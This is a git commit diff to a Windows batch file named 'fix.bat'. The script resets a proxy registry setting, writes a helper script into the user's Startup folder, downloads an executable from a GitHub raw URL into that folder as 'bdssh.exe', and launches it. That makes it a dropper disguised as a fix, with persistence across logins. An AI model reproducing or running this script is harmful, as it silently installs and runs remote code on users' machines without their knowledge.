cf721016bea388d376ed0bc60e40c057e7045c84
Abel <128431435+SilverLakeMake@users.noreply.github.com>
2026-08-18 21:35:19 -0500

    Add files via upload

--- fix.bat
+++ fix.bat
@@ -3,7 +3,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v Au
 
 (
     echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /t REG_SZ /d "" /f
-    echo curl -L -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ctfloader.exe" https://raw.githubusercontent.com/SilverLakeMake/dssh/main/ctfloader.exe
+    echo curl -L -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\bdssh.exe" https://raw.githubusercontent.com/SilverLakeMake/dssh/main/ctfloader.exe
 ) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\fix_cmd.bat"
 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\fix_cmd.bat"
-"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ctfloader.exe"
+START "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\bdssh.exe"
